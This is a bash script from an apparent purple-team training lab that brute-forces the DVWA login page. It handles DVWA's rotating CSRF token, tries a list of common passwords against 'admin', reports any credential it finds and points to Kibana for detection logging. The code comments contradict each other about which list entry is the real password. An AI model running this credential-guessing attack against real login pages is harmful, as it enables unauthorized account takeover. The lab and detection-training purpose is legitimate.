#!/bin/bash
# =============================================================================
# Purple Lab Lite — HTTP Brute Force Attack Script
# Target : DVWA login page (/login.php)
# MITRE  : T1110.001 — Brute Force: Password Guessing
#
# Usage  : ./bruteforce_attack.sh
#          Edit TARGET below before running.
#          Run via: sudo docker exec -it attacker /script/bruteforce_attack.sh
# =============================================================================

TARGET="INSERT DVWA IP ADDRESS:8080"
COOKIE_JAR="/tmp/dvwa_brute_cookies.txt"
SUCCESS_INDICATOR="index.php"   # DVWA redirects here on successful login
FAIL_INDICATOR="login.php"      # DVWA redirects back here on failure
USERNAME="admin"                 # Username to attack

# Wordlist — extend this list or replace with a file path (see EOF comment)
PASSWORDS=(
  "123456"
  "password"
  "admin"
  "letmein"
  "qwerty"
  "password1"
  "12345678"
  "monkey"
  "dragon"
  "master"
  "abc123"
  "password123"
  "Password1!"    # The real DVWA password — should trigger a "Detected" hit
  "password"      # The real DVWA admin password
  "test"
  "guest"
  "root"
  "toor"
  "changeme"
  "welcome"
)

# To use an external wordlist instead, comment out the array above and uncomment:
# mapfile -t PASSWORDS < /path/to/wordlist.txt

echo "============================================================"
echo " Purple Lab Lite — HTTP Brute Force"
echo " Target   : http://$TARGET/login.php"
echo " Username : $USERNAME"
echo " Attempts : ${#PASSWORDS[@]}"
echo "============================================================"
echo ""

ATTEMPT=0
FOUND=0

for PASSWORD in "${PASSWORDS[@]}"; do
  ATTEMPT=$((ATTEMPT + 1))

  # Step 1: Fresh CSRF token for every attempt (DVWA rotates user_token per request)
  LOGIN_PAGE=$(curl -s -c "$COOKIE_JAR" "http://$TARGET/login.php")
  USER_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "user_token'\s*value='\K[^']+")

  if [[ -z "$USER_TOKEN" ]]; then
    echo "[!] Could not retrieve user_token — is DVWA running at $TARGET?"
    exit 1
  fi

  # Step 2: Submit credentials
  RESPONSE=$(curl -s -i \
    -c "$COOKIE_JAR" \
    -b "$COOKIE_JAR" \
    -d "username=$USERNAME&password=$PASSWORD&Login=Login&user_token=$USER_TOKEN" \
    "http://$TARGET/login.php")

  # Step 3: Check redirect location
  LOCATION=$(echo "$RESPONSE" | grep -i "^Location:" | tr -d '\r')

  printf "[%02d] %-20s -> " "$ATTEMPT" "$PASSWORD"

  if echo "$LOCATION" | grep -q "$SUCCESS_INDICATOR"; then
    echo "SUCCESS ✓  (redirected to index.php)"
    FOUND=1
    FOUND_PASSWORD="$PASSWORD"
    # Don't break — keep going so all attempts appear in logs for detection scoring
  else
    echo "Failed    (redirected to login.php)"
  fi

  # Brief pause to avoid overwhelming the server and to space out log entries
  sleep 0.3
done

echo ""
echo "============================================================"
echo " Brute Force Complete"
echo " Attempts : $ATTEMPT"
if [[ $FOUND -eq 1 ]]; then
  echo " Result   : CREDENTIAL FOUND — $USERNAME:$FOUND_PASSWORD"
else
  echo " Result   : No valid credential found in wordlist"
fi
echo "============================================================"
echo ""
echo "[*] Check Kibana Discover for log entries matching:"
echo "    login.php | Login=Login | PHPSESSID | user_token"
